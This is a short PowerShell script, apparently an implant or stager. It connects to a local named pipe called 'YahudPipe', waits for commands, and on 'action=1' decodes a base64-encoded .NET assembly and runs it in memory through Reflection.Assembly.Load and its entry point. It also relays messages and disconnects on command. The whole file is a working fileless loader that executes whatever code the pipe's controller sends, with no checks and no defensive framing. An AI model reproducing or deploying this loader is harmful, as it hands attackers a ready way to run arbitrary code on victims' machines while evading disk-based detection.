function ReadCommand ([System.IO.StreamReader]$StreamReader){
    $msg = $StreamReader.ReadLine()
    if($msg -eq "action=1"){
        Write-Host "Receiving payload..."
        $status = "1"
        return $status
    }
    elseif($msg -eq "action=2"){
        Write-Host "Receiving messages..."
        $status = "2"
        return $status
    }
    elseif($msg -eq "action=3"){
        Write-Host "Disconnected."
        $status = "3"
        return $status
    }
}


$pipeName = "YahudPipe"
$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(".", $pipeName)
Write-Host "Attempting to connect to the pipe..."
$pipeClient.Connect();
Write-Host "Connected."
$sw = New-Object System.IO.StreamWriter($pipeClient)
$sr = New-Object System.IO.StreamReader($pipeClient)
$sw.WriteLine("Olivier")
$sw.AutoFlush = $true # Without autoflush, buffer will flush when the pipe is close, autoflush is necessary for interactive session
$status = "0"

while($pipeClient.IsConnected){
    if($status -eq "0"){
        $status = ReadCommand $sr
    }
    elseif($status -eq "1"){
        $msg = $sr.ReadLine()
        $assemblyByte = [System.Convert]::FromBase64String($msg)
        $assembly = [System.Reflection.Assembly]::Load($assemblyByte)
        $assembly.EntryPoint.Invoke($null, $null)
        $status = "0"
    }
    elseif($status -eq "2"){
        $msg = $sr.ReadLine()
        if($msg -eq "stop"){
            $status = "0"
        }
        else{
            Write-Host $msg
        }
        
    }
    elseif($status -eq "3"){
        $sr.Dispose();
        $pipeClient.Dispose();
    }
    
}

